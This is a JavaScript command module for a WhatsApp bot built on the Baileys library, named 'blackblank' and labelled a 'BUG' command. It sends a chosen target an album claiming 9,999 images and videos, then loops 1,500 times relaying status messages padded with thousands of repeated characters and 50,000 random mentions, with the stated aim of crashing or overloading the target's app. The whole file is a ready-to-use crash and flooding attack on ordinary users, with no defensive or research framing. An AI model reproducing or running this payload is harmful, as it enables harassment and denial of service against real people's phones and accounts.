import { generateWAMessageFromContent, generateWAMessage } from "@whiskeysockets/baileys";

export default {
  name: "blackblank",
  alias: ["blacktotal", "crashalbum"],
  description: "Sends a massive payload of albums and overloaded statuses (Owner Only)",
  category: "BUG",
  group: false,
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      // 🔐 Owner verification based on the bot's ID
      const ownerId = kaya.user.id.split(':')[0];
      const sender = (mek.key.participant || mek.key.remoteJid).split('@')[0];

      if (sender !== ownerId) {
        return kaya.sendMessage(from, { 
          text: "❌ This command is strictly reserved for the owner!" 
        }, { quoted: mek });
      }

      // Target: Either the current chat, or a user mentioned/provided in arguments
      const target = args[0] ? args[0] + "@s.whatsapp.net" : from;
      const mention = true; // Force status mentions activation

      // Default payload image
      const BullCrash = { url: "https://files.catbox.moe/g3w96d.jpg" };

      // 1. Creation of a giant album with an extremely high expected counter
      const album = await generateWAMessageFromContent(target, {
        albumMessage: {
          expectedImageCount: 9999, 
          expectedVideoCount: 9999
        }
      }, {
        userJid: target,
        upload: kaya.waUploadToServer
      });

      await kaya.relayMessage(target, album.message, { messageId: album.key.id });

      // 2. Intensive saturation loop
      for (let i = 0; i < 1500; i++) {
        const photo = {
          image: BullCrash,
          caption: "💀 KAYA BOT BUG ENGINE OVERLOAD 💀" + "ꦾ".repeat(3000)
        };

        const msg = await generateWAMessage(target, photo, {
          upload: kaya.waUploadToServer
        });

        const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

        if (msg.message[type]) {
          msg.message[type].contextInfo = {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 50000 }, () =>
                `1${Math.floor(Math.random() * 8999999 + 1000000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardedNewsletterMessageInfo: {
              newsletterName: "KAY BOT CRASH ENGINE",
              newsletterJid: "120363229235889246@newsletter",
              serverMessageId: 999999
            },
            messageAssociation: {
              associationType: 1,
              parentMessageKey: album.key
            }
          };
        }

        await kaya.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                  ]
                }
              ]
            }
          ]
        });

        if (mention) {
          await kaya.relayMessage(target, {
            statusMentionMessage: {
              message: { protocolMessage: { key: msg.key, type: 25 } }
            }
          }, {
            additionalNodes: [
              { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
          });
        }
      }

      await kaya.sendMessage(from, { text: "⚡ BlackBlankTotal payload successfully dispatched by KAY BOT!" }, { quoted: mek });

    } catch (err) {
      console.error("❌ Error in blackblank command:", err);
      await kaya.sendMessage(from, { text: `Execution error: ${err.message}` }, { quoted: mek });
    }
  }
};
